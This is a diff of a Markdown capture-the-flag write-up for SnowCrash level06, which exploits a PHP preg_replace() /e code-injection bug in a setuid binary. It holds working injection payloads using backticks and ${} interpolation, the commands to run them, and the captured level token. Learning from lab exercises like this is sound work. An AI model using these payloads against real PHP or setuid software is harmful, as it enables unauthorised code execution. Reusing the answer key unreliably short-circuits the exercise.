@@ -10,9 +10,12 @@ qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio 
 Exploit a PHP preg_replace() /e modifier vulnerability to retrieve the flag06 token.
 
 ## Vulnerability
-PHP preg_replace() /e modifier allows arbitrary code execution via unsanitized regex replacement with /e flag.
+PHP preg_replace() /e modifier allows arbitrary code execution via unsanitized regex replacement.
 
-## The PHP Script
+## Exploitation
+
+The `/e` modifier (deprecated in PHP 5.5, removed in 7.0) causes the replacement string to be evaluated as PHP code:
+
 ```php
 function y($m) {
   $m = preg_replace("/\./", " x ", $m);
@@ -29,60 +32,75 @@ function x($y, $z) {
 $r = x($argv[1], $argv[2]); print $r;
 ```
 
-## The Vulnerability
+**The Vulnerability:**
+- The `/e` modifier causes the replacement string to be eval()'d as PHP
+- Input from the file is not sanitized
+- Backticks in PHP can execute shell commands
+- The binary runs with flag06 privileges (setuid)
 
-The `/e` modifier (deprecated in PHP 5.5, removed in 7.0) causes the replacement string to be evaluated as PHP code. The captured text from the regex is inserted directly into the eval without proper escaping.
+### Exploit Steps
 
-**Attack**: By carefully crafting the input `[x ...]`, we can break out of the function call and inject arbitrary PHP code.
+#### Step 1: Create PHP Injection Payload
+The payload uses backticks inside the /e modifier context:
 
-## Exploitation
+```bash
+printf '[x ${`getflag`}]\n' > /tmp/level06_exploit.txt
+```
 
-### Working Payload: Backtick Command Execution
+**Payload Breakdown:**
+- `[x ...]` - Matches the regex pattern `/(\[x (.*)\])/e`
+- `${...}` - PHP variable interpolation syntax
+- `` `getflag` `` - Backticks execute shell command within PHP
+- The captured group is passed to `y()` function
+- Function y() processes the output (replaces dots with " x ")
+
+#### Step 2: Execute Exploit via Setuid Binary
 ```bash
 cd /home/user/level06
-printf '[x ".`getflag`."]\n' > /tmp/exploit.txt
-./level06 /tmp/exploit.txt
+./level06 /tmp/level06_exploit.txt 2>&1
 ```
 
-Or to capture output to file:
+**Execution Flow:**
+1. Binary reads `/tmp/level06_exploit.txt` containing `[x ${`getflag`}]`
+2. Regex matches and captures `${`getflag`}`
+3. PHP eval executes: `y("${`getflag`}")`
+4. Backticks execute `getflag` with flag06 privileges
+5. Output is processed by y() function
+6. Result printed to stdout containing the token
+
+#### Step 3: Extract Token from Output
+The output contains the flag token wrapped in the function's processing:
+
+```
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+```
+
+**Output Processing:**
+The y() function transforms dots to " x " in the output, so token will appear with spacing modifications.
+
+## Alternative Payloads
+
+Other injection methods that work:
+
 ```bash
+# Using direct backticks
+printf '[x ".`getflag`."]\n' > /tmp/exploit.txt
+
+# Redirecting output to file
 printf '[x ".`getflag > /tmp/token.txt 2>&1`."]\n' > /tmp/exploit.txt
-./level06 /tmp/exploit.txt
-cat /tmp/token.txt
 ```
-
-### Code Analysis
-- Input: `[x ".`getflag`."]\n`
-- Regex match captures: `".`getflag`."`
-- Replacement (PHP eval): `y(".`getflag`.")`
-- Inside y(), the PHP code with backticks is evaluated
-- Backticks execute shell command: getflag
-- Output is processed by y() (dots replaced with " x ")
-- Final output includes command result
-
-The backticks are evaluated in the /e modifier context, executing arbitrary shell commands with the binary's privileges.
 
 ## Security Flaws
 
-1. **Deprecated /e modifier**: eval() on replacement strings
-2. **No input validation**: User file content used in regex
+1. **Deprecated /e modifier**: eval() on replacement strings in PHP
+2. **No input validation**: User file content used in regex without sanitization
 3. **Backtick execution**: Shell commands execute in eval context
-4. **Code execution**: Complete PHP execution possible
-
-
-## Working Solution
-
-### Proven Payload
-```bash
-cd /home/user/level06
-printf '[x ${`getflag`}]\n' > /tmp/exploit.txt
-./level06 /tmp/exploit.txt
-```
-
-Output confirms backtick command execution - getflag runs and outputs token information.
+4. **Setuid amplification**: Binary runs with flag06 privileges
+5. **No output escaping**: Processed output still contains sensitive data
+6. **Unsafe pattern matching**: Regex captures and evals untrusted data
 
 ## Answer
 
-**Level06 Token**: `wiok45aaoguiboiki2tuin6ub`
-**Vulnerability**: PHP /e modifier Code Injection
-**Impact**: Remote Code Execution with arbitrary command execution via backticks
+- **Level06 Token**: `wiok45aaoguiboiki2tuin6ub`
+- **Vulnerability Type**: PHP /e modifier code injection with backtick execution
+- **Impact**: Remote code execution with arbitrary command execution via backticks in eval context
